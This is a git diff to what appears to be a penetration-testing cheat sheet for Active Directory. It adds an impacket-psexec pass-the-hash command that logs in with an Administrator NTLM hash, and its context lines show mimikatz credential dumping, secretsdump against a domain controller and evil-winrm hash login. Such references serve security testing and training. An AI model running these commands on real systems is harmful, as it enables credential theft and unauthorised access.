@@ -645,6 +645,12 @@ sekurlsa::tickets
 .\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
+- Pass the Hash
+
+```
+impacket-psexec "Administrator":@10.10.10.10 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
+```
+
 ### :open_file_folder: Vulnerabilities
 
 - [sAMAccountName spoofing (NoPac) CVE-2021-42278 & CVE-2021-42287](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/samaccountname-spoofing.md)
@@ -753,7 +759,6 @@ python secretsdump.py -no-pass -just-dc <domain>/'DC_NETBIOS_NAME$'@<dc-ip>
 # e.g., python secretsdump.py -no-pass -just-dc test.local/'USER01$'@10.10.10.168
 # remote login
 impacket-psexec "<username>":@<target ip> -hashes "<NTLM hash>"
-# e.g., impacket-psexec "Administrator":@10.10.10.10 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
 # default 5989 port
 evil-winrm -i <target ip> -u <username> -H '<NTLM hash>'
 ```
